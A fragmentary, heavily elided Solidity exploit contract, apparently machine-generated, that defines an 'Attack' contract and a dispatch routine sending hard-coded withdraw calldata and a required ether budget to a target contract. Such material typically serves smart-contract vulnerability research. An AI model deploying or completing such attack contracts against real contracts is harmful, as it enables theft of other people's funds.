 ...
 * parameter. Make sure to send at least 0 ether and 3814697265625 wei to the attack
 ...
 * gas limit: 0
 * difficulty: 0
 * initial balance: 0x3782dace9d9 wei
 *
 */
    ...
    function _dispatch() public returns(bool) {
        ...
        if (state == 0) {
            if (id == 0) {
                ...
                input: { uint(2199023255552),  }
 
                 */
                bytes memory data = bytes(hex"2e1a7d4d0000000000000000000000000000000000000000000000000000020000000000");
                uint value = 0x0;
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x3782dace9d9; /* equals 0 ether and 3814697265625 wei */
    uint constant INITIAL_ETHER = 0x3782dace9d9;
